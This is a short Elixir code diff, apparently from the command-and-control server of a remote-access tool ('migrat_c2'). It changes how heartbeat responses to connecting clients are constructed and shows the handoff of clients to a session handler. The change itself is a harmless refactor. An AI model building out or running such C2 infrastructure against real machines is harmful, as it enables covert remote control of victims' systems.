@@ -24,11 +24,11 @@ defmodule Connections.Server do
           entry = Registry.new_heartbeat(ident)
           if entry.wants_connection do
             Logger.info("sending heartbeat response with keepalive")
-            Translator.send_message(client, :heartbeat_response, %Migrat.HeartbeatResponse{keep_open: true}, Application.fetch_env!(:migrat_c2, :initkey))
+            Translator.send_message(client, :heartbeat_response, Migrat.HeartbeatResponse.new(keep_open: true), Application.fetch_env!(:migrat_c2, :initkey))
             Handler.start(client, ident)
           else
             Logger.info("sending heartbeat response")
-            Translator.send_message(client, :heartbeat_response, %Migrat.HeartbeatResponse{keep_open: false}, Application.fetch_env!(:migrat_c2, :initkey))
+            Translator.send_message(client, :heartbeat_response, Migrat.HeartbeatResponse.new(keep_open: false), Application.fetch_env!(:migrat_c2, :initkey))
           end
           loop_acceptor(socket)
         _ ->
